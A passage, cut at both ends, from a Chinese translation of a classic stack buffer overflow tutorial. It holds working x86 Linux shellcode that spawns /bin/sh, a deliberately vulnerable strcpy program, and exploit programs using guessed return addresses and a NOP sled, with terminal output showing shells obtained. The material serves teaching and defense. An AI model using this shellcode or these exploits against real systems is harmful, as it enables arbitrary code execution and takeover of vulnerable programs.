%esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x800015f &lt;main+47&gt;<BR>0x8000135 &lt;main+5&gt;:&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi<BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)<BR>0x8000139 &lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)<BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)<BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax<BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx<BR>0x800014b &lt;main+27&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx<BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx<BR>0x8000151 &lt;main+33&gt;:&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x8000153 &lt;main+35&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,%eax<BR>0x8000158 &lt;main+40&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,%ebx<BR>0x800015d &lt;main+45&gt;:&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x800015f &lt;main+47&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000135 &lt;main+5&gt;<BR>0x8000164 &lt;main+52&gt;:&nbsp;&nbsp;&nbsp; das<BR>0x8000165 &lt;main+53&gt;:&nbsp;&nbsp;&nbsp; boundl 0x6e(%ecx),%ebp<BR>0x8000168 &lt;main+56&gt;:&nbsp;&nbsp;&nbsp; das<BR>0x8000169 &lt;main+57&gt;:&nbsp;&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 0x80001d3 &lt;__new_exitfn+55&gt;<BR>0x800016b &lt;main+59&gt;:&nbsp;&nbsp;&nbsp; addb&nbsp;&nbsp; %cl,0x55c35dec(%ecx)<BR>End of assembler dump.<BR>(gdb) x/bx main+3<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; 0xeb<BR>(gdb)<BR>0x8000134 &lt;main+4&gt;:&nbsp;&nbsp;&nbsp;&nbsp; 0x2a<BR>(gdb)<BR>.<BR>.<BR>.<BR>------------------------------------------------------------------------------<BR><BR>testsc.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";<BR><BR>void main() {<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = (int *)&amp;ret + 2;<BR>&nbsp;&nbsp; (*ret) = (int)shellcode;<BR><BR>}<BR>------------------------------------------------------------------------------<BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o testsc testsc.c<BR>[aleph1]$ ./testsc<BR>$ exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 成了! 但是这里还有一个障碍, 在多数情况下, 我们都是试图使一个字符缓冲区溢出.<BR>那么在我们shellcode中的任何NULL字节都会被认为是字符串的结尾, 复制工作就到此为<BR>止了. 对于我们的破解工作来说, 在shellcode里不能有NULL字节. 下面来消除这些字节,<BR>同时把代码精简一点.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Problem instruction:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Substitute with:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; molv&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR><BR>&nbsp;&nbsp; Our improved code:<BR><BR>shellcodeasm2.c<BR>------------------------------------------------------------------------------<BR>void main() {<BR>__asm__("<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x1f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 46 bytes total<BR>");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp; And our new test program:<BR><BR>testsc2.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>void main() {<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = (int *)&amp;ret + 2;<BR>&nbsp;&nbsp; (*ret) = (int)shellcode;<BR><BR>}<BR>------------------------------------------------------------------------------<BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o testsc2 testsc2.c<BR>[aleph1]$ ./testsc2<BR>$ exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 破解实战&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 现在把手头的工具都准备好. 我们已经有了shellcode. 我们知道shellcode必须是被<BR>溢出的字符串的一部分. 我们知道必须把返回地址指回缓冲区. 下面的例子说明了这几点:<BR><BR><BR>overflow1.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>char large_string[128];<BR><BR>void main() {<BR>&nbsp; char buffer[96];<BR>&nbsp; int i;<BR>&nbsp; long *long_ptr = (long *) large_string;<BR><BR>&nbsp; for (i = 0; i &lt; 32; i++)<BR>&nbsp;&nbsp;&nbsp; *(long_ptr + i) = (int) buffer;<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; large_string[i] = shellcode[i];<BR><BR>&nbsp; strcpy(buffer,large_string);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o exploit1 exploit1.c<BR>[aleph1]$ ./exploit1<BR>$ exit<BR>exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 如上所示, 我们用buffer[]的地址来填充large_string[]数组, shellcode就将会在<BR>buffer[]之中. 然后我们把shellcode复制到large_string字串的开头. strcpy()不做任<BR>何边界检查就会将large_string复制到buffer中去, 并且覆盖返回地址. 现在的返回地址<BR>就是我们shellcode的起始位置. 一旦执行到main函数的尾部, 在试图返回时就会跳到我<BR>们的shellcode中, 得到一个shell.<BR><BR>&nbsp;&nbsp;&nbsp; 我们所面临的问题是: 当试图使另外一个程序的缓冲区溢出的时候, 如何确定这个<BR>缓冲区(会有我们的shellcode)的地址在哪? 答案是: 对于每一个程序, 堆栈的起始地址<BR>都是相同的. 大多数程序不会一次向堆栈中压入成百上千字节的数据. 因此知道了堆栈<BR>的开始地址, 我们可以试着猜出这个要使其溢出的缓冲区在哪. 下面的小程序会打印出<BR>它的堆栈指针: <BR><BR><BR>sp.c<BR>------------------------------------------------------------------------------<BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR>void main() {<BR>&nbsp; printf("0x%x\n", get_sp());<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./sp<BR>0x8000470<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 假定我们要使其溢出的程序如下:<BR>&nbsp;&nbsp;&nbsp; <BR>vulnerable.c<BR>------------------------------------------------------------------------------<BR>void main(int argc, char *argv[]) {<BR>&nbsp; char buffer[512];<BR><BR>&nbsp; if (argc &gt; 1)<BR>&nbsp;&nbsp;&nbsp; strcpy(buffer,argv[1]);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们创建一个程序可以接受两个参数, 一是缓冲区大小, 二是从其自身堆栈指针算起<BR>的偏移量(这个堆栈指针指明了我们想要使其溢出的缓冲区所在的位置). 我们把溢出字符<BR>串放到一个环境变量中, 这样就容易操作一些. <BR><BR>exploit2.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i;<BR><BR>&nbsp; if (argc &gt; 1) bsize&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset = atoi(argv[2]);<BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr += 4;<BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR><BR>&nbsp; memcpy(buff,"EGG=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 现在我们尝试猜测缓冲区的大小和偏移量:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit2 500<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>Illegal instruction<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600 100<BR>Using address: 0xbffffd4c<BR>[aleph1]$ ./vulnerable $EGG<BR>Segmentation fault<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600 200<BR>Using address: 0xbffffce8<BR>[aleph1]$ ./vulnerable $EGG<BR>Segmentation fault<BR>[aleph1]$ exit<BR>.<BR>.<BR>.<BR>[aleph1]$ ./exploit2 600 1564<BR>Using address: 0xbffff794<BR>[aleph1]$ ./vulnerable $EGG<BR>$<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 正如我们所看到的, 这并不是一个很有效率的过程. 即使知道了堆栈的起始地址, 尝<BR>试猜测偏移量也几乎是不可能的. 我们很可能要试验几百次, 没准几千次也说不定. 问题<BR>的关键在于我们必须*确切*地知道我们代码开始的地址. 如果偏差哪怕只有一个字节我们<BR>也只能得到段错误或非法指令错误. 提高成功率的一种方法是在我们溢出缓冲区的前段填<BR>充NOP指令. 几乎所有的处理器都有NOP指令执行空操作. 常用于延时目的. 我们利用它来<BR>填充溢出缓冲区的前半段. 然后把shellcode放到中段, 之后是返回地址. 如果我们足够<BR>幸运的话, 返回地址指到NOPs字串的任何位置, NOP指令就会执行, 直到碰到我们的<BR>shellcode. 在Intel体系结构中NOP指令只有一个字节长, 翻译为机器码是0x90. 假定堆栈<BR>的起始地址是0xFF, S代表shellcode, N代表NOP指令, 新的堆栈看起来是这样:<BR><BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_____________________|<BR><BR>堆栈顶端&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 新的破解程序如下:<BR>&nbsp;&nbsp;&nbsp; <BR>exploit3.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define NOP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x90<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i;<BR><BR>&nbsp; if (argc &gt; 1) 